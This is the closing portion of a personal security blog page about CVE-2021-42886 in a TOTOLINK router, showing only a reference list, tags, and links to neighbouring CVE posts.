    <p><a href="https://github.com/p1Kk/vuln/blob/dcc2b75ab49f8cb0bdadf6f3c5d6b379a73e57c5/totolink_ex1200t_exportsettings_leak.md">https://github.com/p1Kk/vuln/blob/dcc2b75ab49f8cb0bdadf6f3c5d6b379a73e57c5/totolink_ex1200t_exportsettings_leak.md</a></p>
  </li>
  <li>
    <p>https://ghidra-sre.org/</p>
  </li>
  <li>
    <p><a href="https://github.com/scriptingxss/owasp-fstm/releases/download/v1.0/Firmware_Security_Testing_Methodology_Version1.pdf">https://github.com/scriptingxss/owasp-fstm/releases/download/v1.0/Firmware_Security_Testing_Methodology_Version1.pdf</a></p>
  </li>
</ul>

<p>#CVE-2021-42886 #totolink</p>

        
      </section>

      <footer class="page__meta">
        
        


  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#iot-exploitation" class="page__taxonomy-item" rel="tag">IoT Exploitation</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-03-23T00:00:00+08:00">March 23, 2023</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/iot%20exploitation/CVE_2021_42888/" class="pagination--pager" title="CVE-2021-42888: TOTOLINK EX1200T Remote Command Injection
">Previous</a>
    
    
      <a href="/iot%20exploitation/CVE_2021_42889/" class="pagination--pager" title="CVE-2021-42889: Access Points information leak
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    

    
      
        
      
        
      
        
      
        
      
        
      
        
      
    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2024 Zeyad Azima. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>







  </body>
</html>
